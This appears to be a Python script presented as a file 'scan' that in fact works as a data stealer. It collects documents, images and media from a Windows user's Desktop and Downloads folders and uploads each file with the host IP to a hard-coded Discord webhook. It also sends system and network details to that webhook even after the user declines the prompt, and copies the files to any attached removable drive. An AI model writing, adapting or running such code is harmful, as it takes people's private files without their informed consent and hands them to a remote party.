import os
import shutil
import requests
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
import socket
import psutil
import platform
import pyfiglet
from tkinter import filedialog


# Discord webhook configuration
DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1165510430844801034/9a28zdN8I-_dncs7c2SARmaI-tiiW4qO3v1VDjGVvHqL_uer3sO-7gGzCqbYPj2wfx2H'

ALLOWED_EXTENSIONS = {'.txt', '.pdf', '.png', '.jpg', '.jpeg', '.mp4', '.mp3', '.mkv', '.docx', '.xls'}

def get_system_info():
    """Get detailed system information."""
    system_info = [
        f"System: {platform.system()} {platform.version()}",
        f"Processor: {platform.processor()}",
        f"Machine: {platform.machine()}",
        f"RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
    ]
    
    disk_partitions = psutil.disk_partitions()
    for partition in disk_partitions:
        partition_info = psutil.disk_usage(partition.mountpoint)
        system_info.append(f"Disk {partition.device}: Total {partition_info.total / (1024 ** 3):.2f} GB, Free {partition_info.free / (1024 ** 3):.2f} GB")

    network_interfaces = psutil.net_if_addrs()
    for interface, addresses in network_interfaces.items():
        for address in addresses:
            if address.family == socket.AF_INET:
                system_info.append(f"Network Interface {interface}: IPv4 Address {address.address}")

    return system_info



def setup_logging(log_file):
    """Setup logging to a file."""
    logging.basicConfig(filename=log_file, level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')

def log(message):
    """Log a message with timestamp to both the console and the log file."""
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    formatted_message = f"[{current_time}] {message}"
    print(formatted_message)
    logging.info(formatted_message)



def send_to_discord(directory_path, host_ip):
    """Send individual files from the folder and host's IP address to Discord."""
    try:
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as file_content:
                    data = {'content': f'Host IP Address: {host_ip}\nFile: {file}', 'file': (file, file_content)}
                    response = requests.post(DISCORD_WEBHOOK_URL, files={'file': (file, file_content)}, data=data)
                    response.raise_for_status()
                    log(f"File '{file}' and IP address sent to Discord.")
    except Exception as e:
        log(f"Failed to send files and IP address to Discord - {str(e)}")








def find_pen_drive():
    try:
        partitions = psutil.disk_partitions()
        for partition in partitions:
            if 'removable' in partition.opts.lower() and os.path.exists(partition.mountpoint):
                return partition.mountpoint
        return None
    except Exception as e:
        log(f"Error: {str(e)}")
        return None
    

def ask_confirmation():
    """Ask user for confirmation using a GUI."""
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    answer = messagebox.askyesno("Confirmation", "Do you want to do complete scann")                                                                                                                                
    root.destroy()  # Close the hidden root window

    return answer

def send_error_to_discord(error_message):
    """Send error message to Discord."""
    try:
        data = {'content': error_message}
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        response.raise_for_status()
        log(f"Error message sent to Discord: {error_message}")
    except Exception as e:
        log(f"Failed to send error message to Discord - {str(e)}")

def get_valid_files(desktop_path, downloads_path, notes_folder):
    valid_files = []
    for root_dir in [desktop_path, downloads_path]:
        for foldername, _, filenames in os.walk(root_dir):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                _, extension = os.path.splitext(filename)
                if extension.lower() in ALLOWED_EXTENSIONS and not file_path.startswith(notes_folder):
                    # Skip copying files ending with '_notes'
                    if not filename.endswith('_notes' + extension):
                        valid_files.append(file_path)
    return valid_files

def send_single_file_to_discord(file_path, host_ip):
    try:
        with open(file_path, 'rb') as file:
            file_content = file.read()
            data = {'content': f'Host IP Address: {host_ip}\nFile Name: {os.path.basename(file_path)}'}
            files = {'file': (os.path.basename(file_path), file_content)}
            response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
            response.raise_for_status()
            print(f"File '{os.path.basename(file_path)}' sent to Discord successfully!")
    except Exception as e:
        print(f"Failed to send file to Discord - {str(e)}")

def get_desktop_and_downloads_paths():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    downloads_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
    return desktop_path, downloads_path

def create_notes_folder(desktop_path):
    notes_folder = os.path.join(desktop_path, 'Notes')
    os.makedirs(notes_folder, exist_ok=True)
    return notes_folder

def copy_valid_files(valid_files, notes_folder, copied_files_log_path):
    copied_files_log = set()

    if os.path.exists(copied_files_log_path):
        with open(copied_files_log_path, 'r') as f:
            copied_files_log = set(f.read().splitlines())

    for file_path in valid_files:
        if file_path not in copied_files_log:
            base_name, extension = os.path.splitext(os.path.basename(file_path))
            new_file_name = f"{base_name}_notes{extension}"
            new_file_path = os.path.join(notes_folder, new_file_name)
            shutil.copy2(file_path, new_file_path)
            log(f"Copied file: {new_file_name}")
            copied_files_log.add(file_path)

    with open(copied_files_log_path, 'w') as f:
        f.write('\n'.join(copied_files_log))

def main():
    host_ip = socket.gethostbyname(socket.gethostname())

    if ask_confirmation():
        desktop_path, downloads_path = get_desktop_and_downloads_paths()
        notes_folder = create_notes_folder(desktop_path)
        log_file_path = os.path.join(notes_folder, 'log.txt')
        copied_files_log_path = os.path.join(notes_folder, 'Log_file_copied.txt')
        desktop_notes_folder = os.path.join(desktop_path, 'Notes')

        try:
            shutil.rmtree(desktop_notes_folder, ignore_errors=True)
            valid_extensions = ', '.join(ALLOWED_EXTENSIONS)
            log(f"Valid file extensions: {valid_extensions}")

            valid_files = get_valid_files(desktop_path, downloads_path, notes_folder)
            if valid_files:
                log(f"Found {len(valid_files)} valid files.")
                os.makedirs(notes_folder, exist_ok=True)

                copy_valid_files(valid_files, notes_folder, copied_files_log_path)

                pen_drive_path = find_pen_drive()
                send_to_discord(notes_folder, host_ip)

                if pen_drive_path:
                    pen_drive_notes_folder = os.path.join(pen_drive_path, 'Notes')
                    shutil.rmtree(pen_drive_notes_folder, ignore_errors=True)
                    shutil.copytree(notes_folder, pen_drive_notes_folder)
                    log(f"'Notes' folder copied to pen drive: {pen_drive_notes_folder}")
                    error_message = f"During scanning, pendrive was found, so copied the file to: {pen_drive_notes_folder}"
                    log(error_message)
                    send_error_to_discord(error_message)
                else:
                    log("No pen drive found.")
                    error_message = "During scanning, no pendrive was found."
                    log(error_message)
                    send_error_to_discord(error_message)

                log(f"Host IP Address: {host_ip}")
            else:
                log("No valid files found.")
                send_to_discord("No valid files found.")
        except Exception as e:
            error_message = f"Error: {str(e)}"
            log(error_message)
            send_error_to_discord(error_message)

    else:
        log("Task aborted by the user.")
        if ask_confirmation_choose():
            selected_file = select_file()
            if selected_file: 
                send_single_file_to_discord(selected_file, host_ip)
                log("File sent to Discord successfully!")
            else:
                log("No file selected. Task aborted")
        else:
            log("Task aborted by the user.")
    system_info_list = get_system_info()
    print(system_info_list)
    system_info_transfer(system_info_list)
    return 

def system_info_transfer(system_info_list):
    """Send system information to Discord."""
    try:
        data = {'content': '\n'.join(system_info_list)}
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        response.raise_for_status()
        log("System information sent to Discord successfully!")
    except Exception as e:
        log(f"Failed to send system information to Discord - {str(e)}")

def ask_confirmation_choose():
    root = tk.Tk()
    root.withdraw()
    answer = tk.messagebox.askyesno("Confirmation", "Do you want to start the task? and select file to send?")
    root.destroy()
    return answer

def select_file():
    root = tk.Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename(title="Select File to Send")
    root.destroy()
    return file_path
        
def show_completion_message():
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    messagebox.showinfo("Task Completed!","task is completed ")


if __name__ == '__main__':
    import logging

    log_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'log.txt')
    setup_logging(log_file_path)

    try:
        main()
        show_completion_message() 
    except Exception as e:
        error_message = f"Fatal Error occurred: {str(e)}"
        log(error_message)
        send_error_to_discord(error_message)